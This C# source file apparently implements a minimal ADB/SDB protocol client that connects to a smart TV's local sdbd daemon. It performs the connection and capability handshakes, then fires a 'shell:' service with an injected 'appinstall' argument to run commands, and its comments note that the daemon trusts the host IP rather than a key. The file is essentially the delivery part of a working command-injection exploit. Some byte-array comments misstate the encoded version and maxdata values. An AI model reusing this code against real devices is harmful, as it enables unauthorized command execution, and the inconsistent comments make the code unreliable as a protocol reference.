using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace BootAgent
{
    /// <summary>
    /// Minimal ADB/SDB wire-protocol client for localhost sdbd injection.
    /// Speaks just enough of the protocol to open a session, run the capability
    /// handshake, and fire a shell command through the appinstall injection.
    /// </summary>
    public static class SdbClient
    {
        public const int SdbPort = 26101;

        // Pre-built CNXN frame: version 0x01000000, maxdata 4096, "host::\0".
        // Byte-identical to the desktop sdb CLI's handshake — sdbd on a TV in
        // developer mode authorizes by host IP, not by key.
        private static readonly byte[] CnxnFrame =
        {
            0x43, 0x4e, 0x58, 0x4e,   // "CNXN"
            0x00, 0x00, 0x10, 0x00,   // version 0x01000000
            0x00, 0x00, 0x04, 0x00,   // maxdata 4096 (0x00000400 LE, matching sdbd's declared max)
            0x07, 0x00, 0x00, 0x00,   // payload length 7
            0x32, 0x02, 0x00, 0x00,   // checksum
            0xbc, 0xb1, 0xa7, 0xb1,   // magic (~CNXN)
            0x68, 0x6f, 0x73, 0x74,   // "host"
            0x3a, 0x3a, 0x00          // "::\0"
        };

        public enum ReadResult { Ok, Timeout, Closed }

        /// <summary>
        /// Build an ADB frame: 24-byte header + payload.
        /// </summary>
        public static byte[] Frame(string cmd, uint arg0, uint arg1, byte[] data)
        {
            var c = Encoding.ASCII.GetBytes(cmd);
            uint check = 0;
            if (data != null)
                foreach (var b in data) check += b;

            var frame = new byte[24 + (data != null ? data.Length : 0)];
            Array.Copy(c, 0, frame, 0, 4);
            Array.Copy(BitConverter.GetBytes(arg0), 0, frame, 4, 4);
            Array.Copy(BitConverter.GetBytes(arg1), 0, frame, 8, 4);
            Array.Copy(BitConverter.GetBytes((uint)(data != null ? data.Length : 0)), 0, frame, 12, 4);
            Array.Copy(BitConverter.GetBytes(check), 0, frame, 16, 4);
            Array.Copy(BitConverter.GetBytes(~BitConverter.ToUInt32(c, 0)), 0, frame, 20, 4);
            if (data != null && data.Length > 0)
                Array.Copy(data, 0, frame, 24, data.Length);

            return frame;
        }

        /// <summary>
        /// Read exactly <paramref name="needed"/> bytes, handling partial reads.
        /// Returns -1 on timeout, actual count on EOF/error.
        /// </summary>
        private static int ReadExact(Socket s, byte[] buffer, int needed)
        {
            int got = 0;
            while (got < needed)
            {
                int n;
                try { n = s.Receive(buffer, got, needed - got, SocketFlags.None); }
                catch (SocketException ex)
                    when (ex.SocketErrorCode == SocketError.TimedOut)
                {
                    return -1;
                }
                catch { return got; }
                if (n <= 0) return got;
                got += n;
            }
            return got;
        }

        /// <summary>
        /// Read one ADB frame from the socket.
        /// </summary>
        public static ReadResult ReadFrame(Socket s,
            out string cmd, out uint arg0, out uint arg1, out byte[] payload)
        {
            cmd = null; arg0 = 0; arg1 = 0; payload = Array.Empty<byte>();

            var header = new byte[24];
            int got = ReadExact(s, header, 24);
            if (got == -1) return ReadResult.Timeout;
            if (got < 24) return ReadResult.Closed;

            cmd = Encoding.ASCII.GetString(header, 0, 4);
            arg0 = BitConverter.ToUInt32(header, 4);
            arg1 = BitConverter.ToUInt32(header, 8);
            uint len = BitConverter.ToUInt32(header, 12);

            payload = new byte[len];
            if (len > 0)
            {
                int gotPayload = ReadExact(s, payload, (int)Math.Min(len, 8192));
                if (gotPayload == -1 || gotPayload < (int)Math.Min(len, 8192))
                    return ReadResult.Closed;
            }
            return ReadResult.Ok;
        }

        /// <summary>
        /// Try to open a session with localhost sdbd. Sends CNXN, waits for reply.
        /// Returns null on failure.
        /// </summary>
        public static Socket TryConnect(Action<string> log)
        {
            Socket s = null;
            try
            {
                s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveTimeout = 10000,
                    SendTimeout = 10000
                };
                s.Connect(IPAddress.Loopback, SdbPort);
                s.Send(CnxnFrame);

                string cmd; uint a0, a1; byte[] p;
                if (ReadFrame(s, out cmd, out a0, out a1, out p) != ReadResult.Ok)
                {
                    log("CNXN: no reply");
                    s.Close(); return null;
                }

                if (cmd != "CNXN")
                {
                    log("CNXN: unexpected " + cmd);
                    s.Close(); return null;
                }

                log("CNXN: sdbd answered");
                return s;
            }
            catch (Exception ex)
            {
                log("CNXN: " + ex.GetType().Name);
                if (s != null) try { s.Close(); } catch { }
                return null;
            }
        }

        /// <summary>
        /// Run the capability handshake (required before OPEN on some sdbd builds).
        /// </summary>
        public static void Capability(Socket s, Action<string> log)
        {
            s.Send(Frame("OPEN", 0x10, 0, Encoding.ASCII.GetBytes("capability:\0")));

            var deadline = DateTime.UtcNow.AddSeconds(10);
            while (DateTime.UtcNow < deadline)
            {
                string c; uint a0; byte[] p;
                var status = ReadFrame(s, out c, out a0, out _, out p);
                if (status == ReadResult.Closed) break;
                if (status == ReadResult.Timeout) continue;
                if (c == "OKAY")
                {
                    s.Send(Frame("OKAY", 0x10, a0, Array.Empty<byte>()));
                    break;
                }
                if (c == "CLSE") break;
            }
            log("capability handshake done");
        }

        /// <summary>
        /// Fire the injection: open a shell service with the appinstall argument.
        /// Waits up to 15s for frames, acknowledging OKAYs and WRTEs.
        /// </summary>
        public static void Inject(Socket s, string argument, Action<string> log)
        {
            var service = Encoding.ASCII.GetBytes("shell:" + argument + "\0");
            s.Send(Frame("OPEN", 0x12, 0, service));
            log("injection fired (" + argument.Length + "/510 bytes)");

            var deadline = DateTime.UtcNow.AddSeconds(15);
            s.ReceiveTimeout = 3000;
            uint serviceId = 0x12;

            while (DateTime.UtcNow < deadline)
            {
                string c; uint fArg0, fArg1; byte[] p;
                var status = ReadFrame(s, out c, out fArg0, out fArg1, out p);
                if (status == ReadResult.Closed) break;
                if (status == ReadResult.Timeout) continue;
                if (c == "OKAY" || c == "WRTE")
                {
                    try { s.Send(Frame("OKAY", serviceId, fArg0, Array.Empty<byte>())); }
                    catch { }
                }
                if (c == "CLSE") break;
            }
            s.ReceiveTimeout = 10000;
        }
    }
}
